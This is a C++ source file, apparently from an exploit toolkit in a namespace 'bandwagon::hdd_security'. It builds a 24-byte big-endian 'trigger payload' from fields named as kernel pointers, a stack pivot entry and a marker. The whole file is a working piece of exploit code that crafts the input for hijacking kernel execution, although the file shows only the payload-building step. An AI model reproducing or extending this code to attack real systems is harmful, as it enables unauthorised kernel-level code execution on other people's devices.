#include "trigger_payload.hpp"

namespace bandwagon::hdd_security {
namespace {

void StoreBigEndian(std::array<std::uint8_t, 24>* output, std::size_t offset,
                    std::uint32_t value) {
  (*output)[offset] = static_cast<std::uint8_t>(value >> 24);
  (*output)[offset + 1] = static_cast<std::uint8_t>(value >> 16);
  (*output)[offset + 2] = static_cast<std::uint8_t>(value >> 8);
  (*output)[offset + 3] = static_cast<std::uint8_t>(value);
}

}  // namespace

std::array<std::uint8_t, 24> BuildTriggerPayload(
    const TriggerPayload& trigger) {
  std::array<std::uint8_t, 24> result{};
  const std::array<std::uint32_t, 6> words{
      trigger.reserved_00, trigger.kernel_pointer_04, trigger.reserved_08,
      trigger.kernel_pointer_0c, trigger.stack_pivot_entry, trigger.marker};
  for (std::size_t index = 0; index < words.size(); ++index)
    StoreBigEndian(&result, index * 4, words[index]);
  return result;
}

}  // namespace bandwagon::hdd_security
